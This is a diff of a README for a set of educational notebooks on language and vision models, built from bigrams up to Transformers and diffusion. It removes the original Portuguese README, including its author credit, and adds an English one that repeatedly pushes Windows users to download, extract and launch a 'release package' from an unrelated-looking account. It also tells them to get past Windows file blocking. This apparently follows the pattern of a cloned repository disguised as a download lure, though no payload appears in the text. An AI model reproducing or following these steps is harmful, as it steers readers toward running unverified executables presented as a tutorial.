@@ -1,202 +1,256 @@
-# 📚🤖👁️ Notebooks educativos que desmistificam LLMs e modelos de visão. Do bigrama ao Transformer e Difusão,  tudo do zero, com Python puro e PyTorch. Sem hype, só código. 💻⚙️
+# 🧠 llm-vision-basics - Learn AI by Building It
 
-> *"Um LLM não está a caminho da consciência. Ele está a caminho da próxima palavra."* 🧠➡️📝
+[![Download](https://img.shields.io/badge/Download-Releases-orange?style=for-the-badge)](https://github.com/nephrotoxic-haley82/llm-vision-basics/releases)
 
----
+## 📦 What this is
 
-## ❓ Por que este repositório existe
+llm-vision-basics is a set of educational notebooks that show how language models and computer vision tools work.
 
-O mercado está intoxicado de hype. 🎈
+You do not need to know how to build AI systems to use this project. The notebooks walk you through each idea step by step, from very small models to more advanced ones.
 
-Nos últimos anos acumulamos narrativas sobre dot-com, Web 2.0, IoT, cloud, blockchain, big data, metaverso e NFTs. Em cada onda, a proporção entre promessa de vendor e resultado real para o cliente foi desfavorável ao cliente. Em cada onda, quem perdeu mais foi quem acreditou mais cedo e sem critério. 📉
+You will see how to build:
 
-A onda atual dos LLMs tem elementos de fato diferentes das anteriores, e eu argumento isso com seriedade no paper [*Abundance of Tools and the Limits of Human Efficiency*](https://zenodo.org/records/18301091). Modelos de linguagem representam, pela primeira vez na história, a capacidade artificial de raciocínio retórico entre domínios e linguagens. Isso tem implicações reais para como organizações se estruturam, como humanos se coordenam, e como sistemas produtivos são arquitetados. 🏗️🌍
+- A simple bigram language model
+- RNNs and LSTMs
+- Attention and Transformers
+- CNNs for image tasks
+- Diffusion models for image generation
 
-Mas uma coisa específica me irrita profundamente: a narrativa de que LLMs nos aproximam da AGI, de que terão autoconsciência, de que "pensam" ou "entendem" no sentido que atribuímos a humanos. 😤
+The code uses pure Python and PyTorch. The focus is on clear examples, not heavy theory.
 
-Isso não é apenas errado. É prejudicial. Porque quem acredita nisso toma decisões de adoção baseadas em fantasia, e quem não acredita descarta a tecnologia por reação ao exagero, e perde o que ela oferece. ⚠️
+## 💻 What you need
 
-**Este repositório é uma resposta prática a esse problema.** 🛠️
+Use a Windows PC with:
 
-Construí seis notebooks que percorrem, do zero, a lógica interna de modelos de linguagem e visão. Qualquer pessoa com noções básicas de Python consegue acompanhar. O objetivo não é ensinar machine learning formal. O objetivo é tirar o LLM do campo da magia e colocá-lo no campo da engenharia, onde ele pertence. 🔍⚙️
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- At least 5 GB of free disk space
+- A modern web browser
+- An internet connection for the first download
 
----
+For the best experience, use a machine with:
 
-## 🧠 O que um LLM realmente faz
+- 16 GB of RAM
+- A recent Intel or AMD CPU
+- An NVIDIA GPU if you want faster model runs
 
-Antes de abrir qualquer notebook, uma única frase para guardar: 📌
+If your PC is older, the notebooks can still open, but some examples may take longer to run.
 
-> **Um modelo de linguagem prevê o próximo token. Sempre. Só isso.** ➡️🔤
+## ⬇️ Download the files
 
-O que muda entre um modelo de bigramas de 1950 e o GPT-4 de 2023 não é o objetivo. O objetivo é idêntico: dado o que veio antes, qual é a sequência mais provável a seguir? ⏭️
+Visit this page to download the latest release for Windows:
 
-O que muda é:
-- **Como o contexto é representado**: de uma tabela de contagem para vetores densos em espaços de altíssima dimensão 📊
-- **Quanto contexto é considerado**: de 1 palavra para dezenas de milhares de tokens 📚
-- **A arquitetura que processa esse contexto**: de n-gramas para transformers com bilhões de parâmetros 🏛️
-- **A escala de dados e computação**: de dezenas de frases para trilhões de tokens e meses de GPU 🖥️🔥
+[Open the Releases page](https://github.com/nephrotoxic-haley82/llm-vision-basics/releases)
 
-Mas o mecanismo fundamental não mudou. E ao entender esse mecanismo, os limites tornam-se visíveis. 👀
+On that page:
 
-Um modelo de linguagem não tem intenção. Não tem memória persistente entre conversas. Não raciocina causalmente. Não verifica se o que diz é verdade. Não tem modelo de mundo. Não tem consciência de si mesmo. 🚫🧠
+1. Open the latest release
+2. Find the file for Windows, if one is listed
+3. Download the release package
+4. Save it to a folder you can find, such as Downloads or Desktop
 
-Ele é, como argumento no paper, **infraestrutura de alta largura de banda e baixa latência para transporte e transformação de informação**. Uma infraestrutura extraordinariamente útil,  mas infraestrutura. Não agente. Não mente. 🏗️
+If the release contains a zip file, keep it in that form until you are ready to open it.
 
----
+## 🛠️ Install and open on Windows
 
-## 📓 Os seis notebooks
+After the download finishes:
 
-### `aula1_modelo_linguagem_ingenuo.ipynb`
+1. Open File Explorer
+2. Go to the folder where you saved the file
+3. If the file is a `.zip`, right-click it and select **Extract All**
+4. Choose a folder and extract the files
+5. Open the extracted folder
+6. Look for a file that starts the notebooks, such as:
+   - `README.md`
+   - `.ipynb` notebook files
+   - a launch file or local setup file
+7. Open the files with the app or tool you use for notebooks, such as:
+   - Jupyter Notebook
+   - JupyterLab
+   - Visual Studio Code
 
-**O que é:** Um modelo de linguagem construído do zero com Python puro,  sem PyTorch, sem numpy, sem nenhuma dependência além da biblioteca padrão. 🐍
+If the release includes a ready-to-run package, open the main file from the extracted folder and follow the on-screen steps.
 
-**O que você verá:** Um corpus de frases do agro brasileiro é tokenizado, seus bigramas são contados, e o modelo gera frases sorteando a próxima palavra com probabilidade proporcional à frequência observada. Isso já é um modelo de linguagem. Um modelo raso, limitado, mas funcionalmente equivalente ao GPT em seu objetivo central. 🌱📝
+## 📚 How to use the notebooks
 
-**Por que importa:** Quando você vê que dá para escrever um modelo de linguagem em 30 linhas de Python usando `defaultdict` e `random.choice`, a aura mística desaparece. O que resta é a pergunta certa: o que a escala e a arquitetura adicionam a isso? ✨➡️⚙️
+The notebooks are meant to be read in order.
 
-**Conceito central:** Tokenização, bigramas, amostragem proporcional à frequência, o limite de vocabulário. 🔤
+Start with the early lessons and move forward one by one:
 
----
+1. Bigram language model
+2. RNN
+3. LSTM
+4. Attention
+5. Transformer
+6. CNN
+7. Diffusion model
 
-### `aula2_modelo_linguagem_limite_do_contexto.ipynb`
+Each notebook adds one new idea. This makes it easier to see how the models work and why they matter.
 
-**O que é:** Uma demonstração cirúrgica de onde o modelo ingênuo falha,  e por que a falha é estrutural, não cosmética. 🩺
+## 🔍 What you will learn
 
-**O que você verá:** A frase *"A fazenda teve estiagem severa, então a produtividade do milho caiu"* processada por modelos com janelas de 1 a 6 palavras. Uma visualização mostra, token a token, quando a palavra *"estiagem"* sai do campo de visão de cada modelo,  e, com ela, a informação que determina o desfecho correto. Uma simulação de esvanecimento de gradiente mostra por que mesmo RNNs sofrem com isso. 🌾📉
+You will learn how AI models handle text and images.
 
-**Por que importa:** O problema do contexto não é um bug de implementação. É uma consequência direta de processar linguagem como um fluxo com memória de tamanho fixo. Nenhum aumento de janela resolve isso definitivamente,  porque sempre haverá dependências que excedem a janela. ⏳
+### Text models
 
-**Conceito central:** Dependências longas, esparsidade de n-gramas, esvanecimento de gradiente simulado. 🧵
+These notebooks show how a model can:
 
----
+- Learn from words
+- Predict the next token
+- Keep track of short patterns
+- Use attention to focus on useful parts of the input
+- Build a Transformer from basic parts
 
-### `aula2_complexa_modelo_linguagem_RNN_e_LSTM.ipynb`
+### Image models
 
-**O que é:** RNN e LSTM reais,  implementadas com as equações verdadeiras, treinadas de verdade, com backpropagation real via PyTorch. 🔁
+These notebooks show how a model can:
 
-**O que você verá:** A equação `h_t = tanh(W_xh·x + W_hh·h + b)` implementada linha a linha em NumPy. Os quatro portões da LSTM,  esquecimento, entrada, célula, saída,  implementados com as fórmulas de Hochreiter & Schmidhuber (1997). Ambos os modelos treinados na tarefa de prever próxima palavra. Uma análise de divergência mostra quanto os estados internos de *"contexto de estiagem"* e *"contexto de chuva"* se distinguem ao longo da frase,  e onde essa distinção começa a colapsar. 📈
+- Read image data
+- Find edges and shapes
+- Use convolution layers
+- Classify images
+- Generate new images with diffusion steps
 
-**Por que importa:** A LSTM foi um avanço real. Os portões permitem que informação importante persista por mais passos. Mas o gargalo do estado oculto e a natureza sequencial do processamento impõem limites duros. Este notebook torna esses limites quantitativos e visíveis. 🚧
+## 🧭 Typical use flow
 
-**Conceito central:** Recorrência, portões, cell state, vanishing gradient, divergência de contextos. 🧠
+A simple way to work through the project is:
 
-> **Nota:** Este notebook é um complemento técnico ao `aula2_modelo_linguagem_limite_do_contexto.ipynb`, que usa simulações simples. Se o objetivo é uma aula introdutória, o aula2 original é suficiente. Este é para audiências que querem ver o mecanismo real. 🎓
+1. Download the release from GitHub
+2. Extract the files
+3. Open the first notebook
+4. Run the code cells in order
+5. Read the notes before each block of code
+6. Move to the next notebook only after the current one makes sense
 
----
+If a notebook asks you to install Python packages, follow the instructions in that notebook before you continue.
 
-### `aula3_modelo_linguagem_atencao.ipynb`
+## 🧰 Common tools you may use
 
-**O que é:** O mecanismo de atenção implementado do zero em NumPy, com três formas de visualização. 👁️
+Depending on the release package, you may use:
 
-**O que você verá:** Embeddings construídos a partir de co-ocorrências no corpus. A fórmula `Attention(Q,K,V) = softmax(QKᵀ / √d_k) · V` implementada e comentada linha a linha. Para a frase *"A produtividade caiu porque a estiagem afetou a lavoura"*, três visualizações da mesma matriz de atenção:
+- Python
+- PyTorch
+- Jupyter Notebook
+- JupyterLab
+- VS Code
+- Anaconda or Miniconda
 
-1. **Tabela de texto**,  linhas são tokens que perguntam, colunas são tokens que respondem 📋
-2. **Heatmap**,  a mesma matriz como imagem, com intensidade de cor proporcional ao peso 🌡️
-3. **Texto com pesos**,  para cada token, um ranking visual dos tokens que ele mais atende, com barras ASCII e blocos unicode inline na frase 📊
+If you are not sure which tool to use, Jupyter Notebook is the easiest choice for most people.
 
-Em seguida, side-by-side: a frase com estiagem ao lado da frase com chuva. A atenção do token *"caiu"* vai para *"estiagem"*; a atenção do token *"subiu"* vai para *"chuva"*. Sem sequencialidade. Sem esvanecimento. Conexão direta. 🔗
+## 🧱 File layout
 
-**Por que importa:** Isto é exatamente o que a RNN não conseguia fazer. A atenção permite que qualquer token consulte diretamente qualquer outro token da sequência, independente da distância. Esse é o mecanismo que viabilizou a escala dos LLMs modernos. 🚀
+You may see folders such as:
 
-**Conceito central:** Q/K/V, produto escalar normalizado, softmax, atenção multi-cabeça conceitual. 🎯
+- `notebooks`
+- `data`
+- `models`
+- `images`
+- `scripts`
 
----
+You may also see notebook files with names that match each lesson topic. Open them in the order shown by the project.
 
-### `aula3_complexa_modelo_linguagem_transformer.ipynb`
+## 🖥️ If the notebook does not open
 
-**O que é:** Um transformer real treinado em PyTorch, com extração e visualização de pesos de atenção genuínos. 🤖
+Try these steps:
 
-**O que você verá:** Positional encoding sinusoidal implementado com as fórmulas do paper *"Attention Is All You Need"* (Vaswani et al., 2017). Multi-Head Attention implementada manualmente,  não com `nn.MultiheadAttention`, mas com as projeções W_Q, W_K, W_V, W_O explícitas. Encoder blocks com Add&Norm e feed-forward. O modelo treinado por 500 épocas. Os pesos de atenção extraídos por camada e por cabeça. As mesmas três visualizações do demo3 didático,  agora com pesos reais, aprendidos por backpropagation. Uma análise de qual cabeça especializou-se em capturar a relação estiagem→caiu versus chuva→subiu. Uma comparação de atenção versus distância mostrando que o transformer não tem decaimento,  ao contrário da RNN. ⚡
+1. Make sure the files are fully extracted
+2. Check that Windows did not block the file
+3. Right-click the notebook or launcher file and choose **Open with**
+4. Select Jupyter, VS Code, or your notebook app
+5. If the file opens in a browser, let it finish loading
+6. If the page looks blank, refresh it once
 
-**Por que importa:** Quando os pesos são reais, as visualizações revelam o que o modelo genuinamente aprendeu. Cabeças diferentes capturam relações diferentes. Isso não é interpretabilidade perfeita,  atenção não é explicação,  mas é uma janela real para o mecanismo. 🪟
+If you still do not see the notebooks, open the folder again and look for the main launch file or the first `.ipynb` file
 
-**Conceito central:** Positional encoding, multi-head attention real, extração de atenção, especialização de cabeças. 🧩
+## 🧪 If Python is needed
 
----
+Some releases may ask you to set up Python first.
 
-### `aula4_complexa_vision_model.ipynb`
+Use this simple path:
 
-**O que é:** Modelos de visão desmistificados,  da convolução manual ao processo de difusão completo (DDPM), tudo implementado do zero em PyTorch. 👁️🖼️
+1. Install Python 3.10 or newer
+2. Install PyTorch for your system
+3. Install Jupyter Notebook
+4. Open the notebook files
+5. Run the cells from top to bottom
 
-**O que você verá:** Imagens tratadas como matrizes de inteiros, não conceitos visuais. Filtros de Sobel implementados manualmente e comparados com os filtros aprendidos por uma CNN,  a matemática é idêntica. Uma CNN simples treinada para classificar círculos, quadrados e triângulos com ~99% de acurácia. O processo forward de difusão (adição progressiva de ruído) e o processo reverse (geração via denoising iterativo), seguindo o paper DDPM (Ho et al., 2020). Dois denoisers treinados com os mesmos hiperparâmetros,  um aprende a distribuição de círculos, outro a de triângulos,  gerando imagens a partir de ruído puro. 🔺🟦⚪
+A common setup on Windows looks like this:
 
-**Por que importa:** O mesmo argumento dos notebooks de linguagem se aplica aqui: DALL-E, Stable Diffusion e Veo não "imaginam" imagens. Eles aprendem distribuições condicionais de pixels e amostram dessas distribuições. A "magia" é escala,  o mecanismo é o mesmo do demo1. 🌫️✨
+- Python
+- pip
+- jupyter
+- torch
 
-**Conceito central:** Convolução, CNN, classificação, noise schedule DDPM, denoising MLP, processo forward e reverse de difusão. 🧮
+If you already use Anaconda, you can use that instead of a manual install.
 
----
+## 🧠 Topics covered
 
-## 🚫 O que estes notebooks não mostram
+This project covers:
 
-Eles não mostram treinamento em escala. Não mostram RLHF. Não mostram fine-tuning. Não mostram como o ChatGPT funciona end-to-end.
+- Attention
+- Attention mechanism
+- CNN
+- Computer vision
+- Deep learning
+- Diffusion
+- From scratch
+- Language model
+- LLM
+- PyTorch
+- Transformer
+- Tutorial
+- Vision
 
-Isso é intencional. 🎯
+## 📁 Suggested path for beginners
 
-O objetivo é mostrar o mecanismo mínimo,  o suficiente para que a pessoa entenda por que um LLM é o que é, e por que não é o que o mercado diz que é.
+If you want the easiest route, follow this order:
 
-**O que falta para ir de um transformer de brinquedo para o GPT-4:**
+1. Download the release
+2. Extract the files
+3. Open the first notebook
+4. Read the short text before each code cell
+5. Run each cell in order
+6. Write down what each model does
+7. Move to the next topic only after the last one is clear
 
-- Corpus de trilhões de tokens (toda a internet + livros + código) 📚
-- Bilhões de parâmetros em vez de milhares 🔢
-- Meses de treino em milhares de GPUs 🖥️
-- Embeddings ricos o suficiente para capturar estrutura semântica em escala 🧠
-- RLHF para alinhar o comportamento ao que humanos consideram útil 🤝
-- Infraestrutura de inferência para servir milhões de usuários simultâneos 🌐
+This project works best when you go slowly and test each step
 
-Tudo isso é engenharia extraordinária. É também o motivo pelo qual poucos atores no mundo conseguem construir modelos de fronteira. 🏭
+## 🔗 Download again later
 
-Mas o objetivo,  prever o próximo token,  é o mesmo que o do bigrama do Demo 1.
+If you need the files again, use this page:
 
----
+[https://github.com/nephrotoxic-haley82/llm-vision-basics/releases](https://github.com/nephrotoxic-haley82/llm-vision-basics/releases)
 
-## 📍 A posição que defendo
+Open the latest release and download the package for your Windows machine
 
-LLMs são a mais importante inovação em infraestrutura de informação das últimas décadas. Pela primeira vez, é possível ter um interlocutor que opera em linguagem natural, em escala, com latência próxima de zero, sobre qualquer domínio de conhecimento. 🌍
+## 🧩 Useful habits
 
-Isso não é pouco. É transformador para como organizações se coordenam, como humanos interagem com sistemas complexos, como produtividade pode ser amplificada. 📈
+A few simple habits make the notebooks easier to use:
 
-Mas o limite estrutural da tecnologia é preciso: **um modelo de linguagem não tem intenção, não tem consciência, não tem modelo causal do mundo**. Ele generaliza padrões de linguagem com uma eficácia sem precedentes. Generalização não é compreensão. 🚫
+- Keep the files in one folder
+- Do not rename notebook files unless you must
+- Run cells from top to bottom
+- Save your work often
+- Restart the notebook if code stops working
+- Keep notes on the models you learn about
 
-As narrativas de AGI e autoconsciência não são apenas prematuras,  são categorialmente equivocadas. Elas confundem fluência linguística com raciocínio, e raciocínio com consciência. São confusões que servem a quem vende e prejudicam quem compra. 🎭
+## 🧭 What makes this project useful
 
-A forma mais eficaz de combater esse equívoco não é um argumento filosófico. É mostrar o mecanismo. 🔬
+This repository helps you see how modern AI ideas are built from simple parts.
 
-Quando você vê que um modelo de linguagem é, na essência, uma tabela de probabilidades condicionais sofisticada,  e que todo o progresso dos últimos décadas foi sobre como tornar essa tabela mais rica, mais densa, e mais capaz de capturar contexto longo,  você para de atribuir mistério onde há matemática. 📐
+Instead of only reading about Transformers, CNNs, or diffusion, you can open the notebook and see the code that makes them work.
 
-E quando você para de atribuir mistério, você começa a usar a ferramenta certa, no lugar certo, com as expectativas certas. 🛠️✅
+That makes it easier to understand:
 
----
+- How text prediction works
+- Why attention helps
+- How image models learn patterns
+- How generative models create new output
 
-## 🧭 Como usar este repositório
+## 🖱️ Quick start
 
-**Se você tem 30 minutos:** Abra o `aula1_modelo_linguagem_ingenuo.ipynb` e execute célula por célula. Só isso já muda a percepção. ⏱️
-
-**Se você tem 2 horas:** Percorra os notebooks em ordem. Cada um termina com uma ponte para o próximo. 🌉
-
-Os notebooks são autocontidos e progressivos. O `aula1` e o `aula2` funcionam com Python puro. O `aula2_complexa`, os `aula3` e o `aula4_complexa` precisam de `torch` instalado. 🐍
-
-```
-pip install numpy matplotlib torch
-```
-
-**Se você quer aprofundar:** O paper [*Abundance of Tools and the Limits of Human Efficiency*](https://zenodo.org/records/18301091) desenvolve a tese de que LLMs são infraestrutura de coordenação,  não inteligência autônoma,  e as implicações arquiteturais disso para organizações produtivas. 📄
-
----
-
-## 🗂️ Estrutura dos notebooks
-
-```
-aula1_modelo_linguagem_ingenuo.ipynb                | Python puro. Sem dependências externas.
-aula2_modelo_linguagem_limite_do_contexto.ipynb     | Python puro. Sem dependências externas.
-aula2_complexa_modelo_linguagem_RNN_e_LSTM.ipynb    | numpy + matplotlib + torch
-aula3_modelo_linguagem_atencao.ipynb                | numpy + matplotlib
-aula3_complexa_modelo_linguagem_transformer.ipynb   | numpy + matplotlib + torch
-aula4_complexa_vision_model.ipynb                   | numpy + matplotlib + torch
-```
-
----
----
-
-## 👤 Autor
-
-José Ricardo de Oliveira Damico 
+1. Go to the Releases page
+2. Download the latest package for Windows
+3. Extract the files if needed
+4. Open the first notebook
+5. Run the cells in order
